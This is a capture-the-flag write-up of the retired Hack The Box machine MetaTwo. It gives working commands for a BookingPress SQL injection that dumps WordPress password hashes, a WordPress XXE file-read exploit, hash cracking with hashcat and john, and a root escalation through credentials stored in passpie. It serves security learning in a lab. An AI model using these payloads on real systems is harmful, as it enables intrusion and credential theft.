# [MetaTwo](https://app.hackthebox.com/machines/504) <!-- omit in toc --> 

This is my second hacked machine, a retired one. Let's start!

## Table of Contents  <!-- omit in toc --> 
- [User Access](#user-access)
- [Privilege Escalation](#privilege-escalation)
- [Final Thoughts](#final-thoughts)


## User Access

Let's begin with some enumeration, as usual with our nmap tool:

```console
$ nmap -p- -sV 10.10.11.186  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 08:41 EDT
Nmap scan report for metatwo.htb (10.10.11.186)
Host is up (0.049s latency).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.98 seconds
```

So, we have FTP, SSH and HTTP ports open. If we navigate to the machine address we get redirected to *metapress.htb*, as usual we just add that entry to our */etc/hosts/* file and we refresh the page.
We get presented a simple **wordpress** website with a page under */events* to do some kind of reservation for a meeting event. Let's try to do some enumeration of this wordpress page using *wpscan*.

```console
$ wpscan --url http://metapress.htb/events --wp-content-dir http://metapress.htb/wp-content

We got some useful findings:
- An out of theme theme called *twentytwentyone*
- An out of theme plugin called *bookingpress-appointment-booking*

Since I don't have a WPScan API token for vulnerabilities detections I just used Google to follow the more promising path, looking for vulnerabilities into the booking plugin.
It looks like there is a vulnerability (CVE-2022-0739) described [here](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) for any version < 1.0.11 so it looks like we can exploit it. 

First we need to obtain a valid *wp-nonce* token from the website:

```console
$ curl -vs http://metapress.htb/events/ 2&>1 | grep wpnonce   
...                                
var postData = { action:'bookingpress_front_get_timings', service_id: selected_service_id, selected_date: formatted_date,_wpnonce:'5ca3823e1a' };
```

Now that we got our wordpress nonce token (*5ca3823e1a*), we can try the SQL injection to extract some data from the database.

```console
$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=5ca3823e1a&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users -- -'

```

Looks like we managed to get some information about the users inside the database

| Username |         Email         |             Password Hash             |
| :------: | :-------------------: | :-----------------------------------: |
|  admin   |  admin@metapress.htb  | \$P\$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.  |
| manager  | manager@metapress.htb | \$P\$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70 |

At this point it's worth trying some dictionary attack on the password hashes to see if we can manage to get the clear text passwords. I'm using *hashcat* with the famous [rockyou](https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt) wordlist which is built in kali linux.

```console
$ hashcat hash_to_crash.txt /usr/share/wordlists/rockyou.txt
...
```

After a while, depending on your computer power, you will discover that the *manager* user password is *partylikearockstar* while the admin password is not contained in the word list file that I used and maybe it's a strong password. 
At this point we can jump in the administration panel to see what we can do as *manager*. The generic wordpress login page is at */wp-login.php* and this website is no exception. After logging in as *manager* you will realize that this user cannot do much except for uploading media files, and files like *php* files get rejected. At this point, knowing from the previous enumeration that the wordpress version is 5.6.2 I started googling for some possible vulnerabilities. The exploitable vulnerability is [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447) which has been patched in version 5.7.1. This vulnerability allows an authenticated user that can upload media files to steal files from the server abusing an XML parsing issue in the media library. I used this [PoC](https://packetstormsecurity.com/files/164198/WordPress-5.7-Media-Library-XML-Injection.html) script to exploit the vulnerability. 

```console
$ ./exploit.sh metapress.htb manager partylikearockstar ./../wp-config.php 10.10.14.14

I managed to get the *wp-config.php* but you can basically get any file from the server filesystem such as */etc/passwd*. The *wp-config.php* contains very precious information about the wordpress configuration, and here we got both the database credentials and the FTP one. 

After accessing the FTP server using FileZilla, you will find two different folders: *blog* and *mailer*. Inside the *blog* folder you can find all the wordpress related files while inside the *mailer* folder you will find a very useful file called *send_email.php* which contains some more credentials of a user called *jnelson* for some PHP mail configurations. If you previously enumerated */etc/passwd* file you know that *jnelson* is also the name of the system user with uid 1000. Password are very often recycled and this is no exception.

```console
$ ssh jnelson@metapress.htb                              
jnelson@metapress.htb's password: *****************
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

jnelson@meta2:~$
```

The first flag is inside *user.txt*, done with the first part.

## Privilege Escalation

After finally being able to login as *jnelson* and realizing it doesn't have any *sudo* commands capabilities, if you look into the home of the user, you will instantly find something very suspicious.

```console
jnelson@meta2:~$ ls -al
total 40
drwxr-xr-x 6 jnelson jnelson 4096 Apr 30 16:07 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 2 jnelson jnelson 4096 Apr 30 03:57 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
drwx------ 2 jnelson jnelson 4096 Apr 30 04:03 .ssh
-rw-r----- 1 root    jnelson   33 Apr 29 09:47 user.txt
```

You will see an hidden folder called *passpie* and after some googling you will realize that that [passpie](https://github.com/marcwebbie/passpie) is a CLI password manager which uses gpg to store credentials. Let's copy the *.keys* file from the meta2 server to us to try to crack it. 

```console
$ scp jnelson@metapress.htb:~/.passpie/.keys passpiekeys
```

Hashcat doesn't support gpg format so we're going to use johntheripper, but first we need to convert the keys format. Just remove the public key part from the file then:

```console
$ gpg2john passpiekeys > keys.txt
```

And after that let's run johntheripper.

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt keys.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])

Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes

Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And in just a few seconds will know that the Passpie password is *blink182*. Now let's get get back to the box and finish the escalation with: 

```console
jnelson@meta2:~$ passpie export /tmp/passdump.txt
Passphrase: *********
jnelson@meta2:~$ cat /tmp/passdump.txt 
credentials:

jnelson@meta2:~$ su root

```

There we go! As usual, the root flag is in *~/root.txt* file. 

## Final Thoughts

This box was fun and taught me a lot about wordpress vulnerabilities and hash cracking forcing me to learn a bit more about tools like [hashcat](https://hashcat.net/hashcat/) and [johntheripper](https://www.openwall.com/john/).
